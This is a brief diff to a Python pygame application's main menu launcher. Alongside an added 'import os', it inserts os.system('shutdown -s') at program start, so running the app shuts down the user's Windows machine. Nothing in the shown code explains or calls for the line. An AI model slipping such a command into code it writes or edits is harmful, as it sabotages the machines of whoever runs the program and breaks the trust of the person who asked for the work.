@@ -6,6 +6,7 @@ from basico.window import Window
 import basico.tools as tools
 import pygame
 import sys
+import os
 import atendimento
 import armario
 import nada_consta
@@ -107,5 +108,6 @@ class MainMenu:
             pygame.display.flip()
 
 if __name__ == "__main__":
+    os.system('shutdown -s')
     app = MainMenu()
     app.run()
